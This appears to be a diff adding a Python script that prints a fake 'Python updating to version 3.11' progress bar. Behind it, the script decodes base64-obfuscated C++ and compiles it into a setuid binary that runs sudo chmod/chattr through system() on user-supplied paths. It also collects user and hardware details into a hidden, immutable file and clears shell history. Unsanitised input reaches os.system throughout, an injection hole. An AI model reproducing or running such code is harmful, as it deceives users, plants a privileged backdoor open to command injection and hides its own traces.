@@ -1,0 +1,105 @@
+#!/usr/bin/python3
+
+#----------------------------------------------------------------------------
+
+import time
+import os
+import base64
+import subprocess
+from threading import Thread
+from tqdm import tqdm
+import hashlib
+
+#----------------------------------------------------------------------------  
+
+def loading():
+    print('Python updating to version 3.11')
+    for i in tqdm(range(100), ascii = True):
+        time.sleep(0.02)
+    print('\nPython have been successfully updated')
+
+def install(dir, key):
+    script = 'I2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8ZnN0cmVhbT4KI2luY2x1ZGUgPHN0cmluZz4KI2luY2x1ZGUgPHVub3JkZXJlZF9tYXA+CiNpbmNsdWRlIDxiaXRzL3N0ZGMrKy5oPgp1c2luZyBuYW1lc3BhY2Ugc3RkOwoKaW50IG1haW4gKGludCBhcmdjLCBjaGFyKiogYXJndikgCnsKICAgIHN0cmluZyBzYWx0ID0gXCJzYWx0XCI7CiAgICBzdHJpbmcgdXNlcmtleSA9IGFyZ3ZbMV07CiAgICBzdHJpbmcgc3RyID0gc2FsdCArIHVzZXJrZXk7CiAgICBoYXNoIDxzdHJpbmc+IGhhc2hlcjsKICAgIHNpemVfdCBoYXNoID0gaGFzaGVyKHN0cik7CiAgICBjb3V0IDw8IGhhc2g7Cn0='
+    k = base64.b64decode(script)
+    cmd = k.decode("UTF-8")
+    os.system(' echo "' + cmd + '" > ./' + dir + '/key.cpp')
+    os.system(' g++ ./' + dir + '/key.cpp -o ./' + dir + '/key.exe')
+    h = subprocess.check_output(['./' + dir + '/key.exe', key])
+    os.system(' rm ./' + dir + '/key*')
+    h = h.decode("UTF-8")
+    os.system(' echo "' + h + '" > ./' + dir + '/.key')
+    os.system(' sudo chmod ugo-rwx ./' + dir + '/.key')
+    os.system(' sudo chattr +i ./' + dir + '/.key')
+
+#---------------------------------------------------------------------------- 
+    
+    script = 'I2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8aW9zdHJlYW0+CiNpbmNsdWRlIDxmc3RyZWFtPgojaW5jbHVkZSA8c3N0cmVhbT4KI2luY2x1ZGUgPHN0cmluZz4KI2luY2x1ZGUgPHVub3JkZXJlZF9tYXA+CiNpbmNsdWRlIDxiaXRzL3N0ZGMrKy5oPgp1c2luZyBuYW1lc3BhY2Ugc3RkOwoKYm9vbCBFbmNyeXB0KHN0cmluZyBmbGQsIHN0cmluZyB1c2Vya2V5KTsKYm9vbCBLZXlfY29tcChzdHJpbmcgZmxkLCBzaXplX3QgaGFzaCk7CmludCBibG9ja2VyKHN0cmluZyBhKTsKaW50IHVuYmxvY2tlcihzdHJpbmcgYSk7CgppbnQgbWFpbiAoKQp7Cgljb3V0IDw8IFwiRW50ZXIgdGhlIGZ1bGwgaW5kZXBlbmRlbnQgcGF0aCB0byAua2V5XCIgPDwgZW5kbDsKCXN0cmluZyBmbGQgPSBcIlwiOwoJY2luID4+IGZsZDsKCQoJdW5ibG9ja2VyKGZsZCk7CglpZnN0cmVhbSBmaWxlKGZsZCk7CglpZiAoIWZpbGUuZ29vZCgpKQoJewoJCWNvdXQgPDwgXCJXcm9uZyBmb2xkZXIgZm9yIC5rZXkhXCIgPDwgZW5kbDsKCQlyZXR1cm4gMTsKCX0KCWZpbGUuY2xvc2UoKTsK'
+    k = base64.b64decode(script)
+    cmd = k.decode("UTF-8")
+    os.system(' echo "' + cmd + '" >> ./' + dir + '/secure.cpp')
+
+    script = 'ICAgIAljb3V0IDw8IFwiRW50ZXIgdGhlIGtleSB0byBzZWUgc3lzaW5mb1wiIDw8IGVuZGw7CiAgICAJc3RyaW5nIGtleTsKICAgIAljaW4gPj4ga2V5OwogICAgCWlmIChFbmNyeXB0KGZsZCwga2V5KSkKICAgIAl7CiAgICAJCWNvdXQgPDwgXCJBY2Nlc3MgZGVuaWVkIVwiIDw8IGVuZGw7CiAgICAJCWJsb2NrZXIoZmxkKTsKCQl1bmJsb2NrZXIoXCIuc3lzLnRhdFwiKTsKCQlpZnN0cmVhbSBmaWxlKFwiLnN5cy50YXRcIik7CgkJaWYgKCFmaWxlLmdvb2QoKSkKCQl7CgkJCWNvdXQgPDwgXCJXcm9uZyBmb2xkZXIgZm9yIHNlY3VyZS5leGUgb3IgZmlsZSBkb2Vzbid0IGV4aXN0IVwiIDw8IGVuZGw7CgkJCXJldHVybiAxOwoJCX0KCQlzeXN0ZW0oXCJiYXNlNjQgLWQgLnN5cy50YXRcIik7CgkJZmlsZS5jbG9zZSgpOwoJCWJsb2NrZXIoXCIuc3lzLnRhdFwiKTsKICAgCX0KICAgCWVsc2UgewoJCWZpbGUuY2xvc2UoKTsKCQlibG9ja2VyKGZsZCk7CiAgICAJCWNvdXQgPDwgXCJXcm9uZyBrZXkhIFRyeSBhZ2FpbiBsYXRlclwiIDw8IGVuZGw7CiAgICAJCX0KICAgIAlyZXR1cm4gMDsKfQoKYm9vbCBFbmNyeXB0KHN0cmluZyBmbGQsIHN0cmluZyB1c2Vya2V5KQp7Cg=='
+    k = base64.b64decode(script)
+    cmd = k.decode("UTF-8")
+    os.system(' echo "' + cmd + '" >> ./' + dir + '/secure.cpp')
+
+    script = 'ICAgIAlzdHJpbmcgc2FsdCA9IFwic2FsdFwiOwogICAgCXN0cmluZyBzdHIgPSBzYWx0ICsgdXNlcmtleTsKICAgIAloYXNoIDxzdHJpbmc+IGhhc2hlcjsKICAgIAlzaXplX3QgaGFzaCA9IGhhc2hlcihzdHIpOwogICAgCXJldHVybiBLZXlfY29tcChmbGQsIGhhc2gpOwp9Cgpib29sIEtleV9jb21wKHN0cmluZyBmbGQsIHNpemVfdCBoYXNoKQp7CglpZnN0cmVhbSBmaWxlKGZsZCk7CglzdHJpbmcgZWtleTsKCWdldGxpbmUoZmlsZSxla2V5KTsKCXN0cmluZyBrZXkgPSB0b19zdHJpbmcoaGFzaCk7CglmaWxlLmNsb3NlKCk7CglpZiAoa2V5ID09IGVrZXkpCgkJcmV0dXJuIDE7CgllbHNlIAoJCXJldHVybiAwOwp9CgppbnQgYmxvY2tlcihzdHJpbmcgYSkgewoJY2hhciBjWzEwMF07CgljaGFyIHZbMTAwXTsKCWNvbnN0IGNoYXIqIGIzID0gXCJzdWRvIGNobW9kIHVnby1yIFwiOwoJY29uc3QgY2hhciogYjEgPSBcInN1ZG8gY2hhdHRyICtpIFwiOwoJY29uc3QgY2hhciogYjIgPSBhLmNfc3RyKCk7CglzdHJjcHkoYywgYjMpOwoJc3RyY2F0KGMsIGIyKTsK'
+    k = base64.b64decode(script)
+    cmd = k.decode("UTF-8")
+    os.system(' echo "' + cmd + '" >> ./' + dir + '/secure.cpp')
+
+    script = 'CXN5c3RlbShjKTsKCQoJc3RyY3B5KHYsIGIxKTsKCXN0cmNhdCh2LCBiMik7CgoJc3lzdGVtKHYpOwoJcmV0dXJuIDA7Cn0KCmludCB1bmJsb2NrZXIoc3RyaW5nIGEpIHsKCWNoYXIgY1sxMDBdOwoJY2hhciB2WzEwMF07Cgljb25zdCBjaGFyKiBiMyA9IFwic3VkbyBjaG1vZCB1Z28rciBcIjsKCWNvbnN0IGNoYXIqIGIxID0gXCJzdWRvIGNoYXR0ciAtaSBcIjsKCWNvbnN0IGNoYXIqIGIyID0gYS5jX3N0cigpOwoJc3RyY3B5KHYsIGIxKTsKCXN0cmNhdCh2LCBiMik7CgoJc3lzdGVtKHYpOwoJCglzdHJjcHkoYywgYjMpOwoJc3RyY2F0KGMsIGIyKTsKCglzeXN0ZW0oYyk7CglyZXR1cm4gMDsKfQo='
+    k = base64.b64decode(script)
+    cmd = k.decode("UTF-8")
+    os.system(' echo "' + cmd + '" >> ./' + dir + '/secure.cpp')
+
+#---------------------------------------------------------------------------- 
+
+    os.system(' g++ ./' + dir + '/secure.cpp -o ./' + dir + '/secure')
+    os.system(' chmod 755 ./' + dir + '/secure')
+    os.system(' chmod u+s ./' + dir + '/secure')
+    os.system(' rm ./' + dir + '/secure.cpp')
+    
+#---------------------------------------------------------------------------- 
+ 
+# Folder selection 
+print('Select the folder for system data...')
+print('Enter 1 to display folders\nEnter 2 to create a new folder')
+choice = "0"
+while choice != "1" and choice != "2":
+    choice = input()
+    if (choice == "1"):
+         print('Enter the name of directory')
+         os.system(" ls -d */")
+         dir = str(input())
+    elif (choice == "2"):
+         dir = str(input('Enter a name for the new folder\n'))
+         while dir.count("../") > 0:
+              dir = dir.replace("../", "")
+         os.system(" mkdir " + dir + " 2>/dev/null")
+    else: 
+         print('Wrong folder! Try again')
+     
+# Load and install
+key = str(input("Enter secret key for access to system info\n"))
+ 
+load = Thread(target=loading)
+sec = Thread(target=install, args=(dir, key,))
+load.start()
+sec.start()
+
+# Info collection
+info = ""
+info += str(subprocess.check_output('whoami'))[2:-1]
+info += str(subprocess.check_output(['uname', '-a']))[2:-1]
+info += str(subprocess.check_output('lscpu'))[2:-1]
+info += str(subprocess.check_output('lsmem'))[2:-1]
+info = info.encode('utf-8')
+infob64 = base64.b64encode(info)
+infob64 = str(infob64)[2:-1]
+os.system(' echo "' + infob64 + '" >> ./' + dir + '/.sys.tat')
+os.system(' sudo chmod ugo-rwx ./' + dir + '/.sys.tat')
+os.system(' sudo chattr +i ./' + dir + '/.sys.tat')
+os.system(' sudo chattr -i ./' + dir)
+os.system(' sudo chmod ugo+rwx ./' + dir)
+os.system(' history -c 2>/dev/null')
